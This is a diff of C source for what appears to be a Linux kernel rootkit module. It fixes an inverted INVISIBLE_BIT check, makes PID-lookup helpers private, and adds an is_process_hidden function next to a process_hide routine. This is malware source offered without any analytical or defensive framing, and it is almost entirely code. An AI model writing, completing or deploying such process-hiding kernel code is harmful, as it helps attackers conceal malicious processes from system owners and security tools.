@@ -19,20 +19,20 @@
 #include <linux/pid.h>
 #include <linux/pid_namespace.h>
 
-#include "proc/proc.h"
+#include "ctrl/details/pid_utils.h"
 
 /******************************************************************************
  *  Private functions.
  ******************************************************************************/
 
 #define INVISIBLE_BIT               0x10000000
-#define IS_PROC_HIDDEN(p_task)      ((p_task->flags & INVISIBLE_BIT) == 0)
+#define IS_PROC_HIDDEN(p_task)      ((p_task->flags & INVISIBLE_BIT) != 0)
 
 /******************************************************************************
- *  Public functions.
+ *  Private functions.
  ******************************************************************************/
 
-struct pid* find_pid(pid_t nr)
+static struct pid* find_pid(pid_t nr)
 {
     struct pid *pid;
 
@@ -56,7 +56,7 @@ struct task_struct* find_process(pid_t pid)
 }
 */
 
-struct task_struct* find_process(pid_t pid)
+static struct task_struct* find_process(pid_t pid)
 {
     struct pid* p_pid = find_pid(pid);
     enum pid_type type = PIDTYPE_PID;
@@ -69,6 +69,20 @@ struct task_struct* find_process(pid_t pid)
     }
     rcu_read_unlock();
     return p_task;
+}
+
+/******************************************************************************
+ *  Public functions.
+ ******************************************************************************/
+
+int is_process_hidden(pid_t pid)
+{
+    struct task_struct* p_task = NULL;
+    p_task = find_process(pid);
+    if (p_task == NULL) {
+        return 0;
+    }
+    return IS_PROC_HIDDEN(p_task);
 }
 
 long process_hide(pid_t pid)
